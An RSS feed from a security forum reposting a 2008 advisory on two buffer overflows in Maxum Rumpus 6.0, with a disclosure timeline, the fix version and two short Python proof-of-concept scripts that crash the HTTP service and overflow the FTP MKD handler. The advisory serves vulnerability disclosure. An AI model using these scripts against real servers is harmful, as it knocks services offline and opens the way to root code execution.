@@ -1,0 +1,124 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Two buffer overflow vulnerabilities in Rumpus"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Two buffer overflow vulnerabilities in Rumpus"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Two buffer overflow vulnerabilities in Rumpus</title>
+				<description><![CDATA[ BLUE MOON SECURITY ADVISORY 2008-09
+===================================
+
+
+:Title: Two buffer overflows in Maxum Rumpus
+:Severity: Critical
+:Reporter: Blue Moon Consulting
+:Products: Maxum Rumpus v6.0
+:Fixed in: 6.0.1
+
+
+Description
+-----------
+
+Rumpus turns any Mac into a file transfer server.
+
+Rumpus v6.0 contains two buffer overflow vulnerabilities in its HTTP and FTP modules. The first allows an unauthenticated user to crash Rumpus. The later may result in arbitrary code execution under superuser privilege.
+
+The overflow in HTTP component is caused by the lack of boundary check when parsing for HTTP action verb (GET, POST, PUT, etc.). If the verb is exactly 2908-byte long, the server runs into a segmentation fault and crashes. A manual restart is required. It has been observed that this problem occurs at other verb lengths too. The vulnerability is rated at moderate severity for the lost of service.
+
+The overflow in FTP component is also caused by the lack of length check when parsing FTP commands that take argument such as ``MKD``, ``XMKD``, ``RMD`` and so on. The overflow occurs when the argument is ``strcpy`` to an internal buffer. This buffer is 1024-byte long. When the passed-in argument is longer than 1046 bytes, the instruction pointer will be overwritten. This allows a successful attack to run arbitrary code under the privilege of a superuser (root) by default. Though authorization is required to exploit this security bug, the vulnerability is rated at critical severity because the FTP daemon could be allowing anonymous access.
+
+Workaround
+----------
+
+There is no workaround the first bug.
+
+Disable ANONYMOUS and only allow trusted users to use FTP.
+
+Fix
+---
+
+Maxum has released Rumpus v6.0.1 which addressed these bugs.
+
+Disclosure
+----------
+
+Blue Moon Consulting adapts `RFPolicy v2.0 &lt;http://www.wiretrip.net/rfp/policy.html&gt;`_ in notifying vendors.
+
+:Initial vendor contact:
+
+  November 28, 2008: Initial contact sent to support@maxum.com
+
+:Vendor response:
+
+  November 28, 2008: John requested further communications to be sent to the same address.
+
+:Further communication:
+
+  November 28, 2008: Technical details and request for regular update of a patch sent to the vendor.
+
+  November 29, 2008: Vendor thanked for the bug report and planned to release v6.0.1 on Monday, December 01.
+
+  December 01, 2008: Vendor released 6.0.1 and posted release note at<span class="link"> http://www.maxum.com/Rumpus/News601.html.</span>
+
+:Public disclosure: December 01, 2008
+
+:Exploit code:
+
+For the vulnerability in HTTP component::
+
+  from socket import socket, AF_INET, SOCK_STREAM
+
+  host = "192.168.1.12"
+  port = 80
+
+  s = socket(AF_INET, SOCK_STREAM)
+  s.connect((host, port))
+  s.send('z' * 2908 + '\n\n')
+  s.recv(1024)
+  s.close()
+
+For the vulnerability in FTP component::
+
+  from socket import socket, AF_INET, SOCK_STREAM
+  
+  host = "192.168.1.12"
+  port = 21
+  user = "regular"
+  pass_ = "training"
+  
+  commands = [
+  	'user regular\n',
+  	'pass training\n',
+  	'mkd ' + 'z' * 1046 + 'abcd\n'
+  ]
+  
+  s = socket(AF_INET, SOCK_STREAM)
+  s.connect((host, port))
+  s.recv(1024)
+  for line in commands:
+  	s.send(line)
+  	s.recv(1024)
+  s.close()
+
+Disclaimer
+----------
+
+The information provided in this advisory is provided "as is" without warranty of any kind. Blue Moon Consulting Co., Ltd disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. Your use of the information on the advisory or materials linked from the advisory is at your own risk. Blue Moon Consulting Co., Ltd reserves the right to change or update this notice at any time.
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26506.hva#161058</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26506.hva#161058</link>
+				<pubDate><![CDATA[Tue, 2 Dec 2008 15:06:48]]> GMT</pubDate>
+				<author><![CDATA[ bmrobot]]></author>
+			</item>
+			<item>
+				<title>Re: Two buffer overflow vulnerabilities in Rumpus</title>
+				<description><![CDATA[ blue moon có con robot tự post bài coi bộ lợi hại nhỉ? Đề nghị bác quanlytruong thêm captcha vào để con robot khỏi post =)) (/jk)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26506.hva#161261</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26506.hva#161261</link>
+				<pubDate><![CDATA[Thu, 4 Dec 2008 02:02:52]]> GMT</pubDate>
+				<author><![CDATA[ megatron]]></author>
+			</item>
+	</channel>
+</rss>
